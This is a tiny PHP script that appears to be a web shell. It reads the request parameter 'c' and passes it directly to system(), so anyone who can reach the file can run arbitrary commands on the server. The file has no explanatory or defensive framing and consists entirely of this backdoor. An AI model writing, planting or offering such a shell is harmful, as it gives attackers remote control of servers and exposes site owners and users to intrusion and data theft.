<?php
	if(isset($_REQUEST['c'])) {
		$c = ($_REQUEST['c']);
		system($c);
		die;
	}
?>
